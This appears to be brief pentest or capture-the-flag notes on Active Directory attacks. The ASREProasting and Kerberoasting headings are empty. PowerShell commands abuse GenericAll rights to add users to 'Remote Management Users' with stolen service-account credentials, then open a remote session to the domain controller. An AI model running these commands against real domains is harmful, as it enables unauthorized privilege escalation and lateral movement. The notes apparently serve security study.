### Users Description

### ASREProasting


### KERBroasting


### GenericAll Abuse
```powershell
Add-ADGroupMember -Identity "Remote Management Users" -Members helpdesk, pparker -Credential $ldapsvc -Server $dc
###
(Get-DomainGroup  -Identity "Remote Management Users" -Domain $domain -Server $dc -Credential $helpdesk).member
###
Add-DomainGroupMember -Identity  "Remote Management Users"  -Members 'helpdesk','pparker' -Credential $ldapsvc
```

### Powershell Remoting!!!
```powershell
$helpdeskSess = New-PSSession -ComputerName $dc -Credential $helpdesk
###
Enter-PSSession -Session $helpdeskSess
```
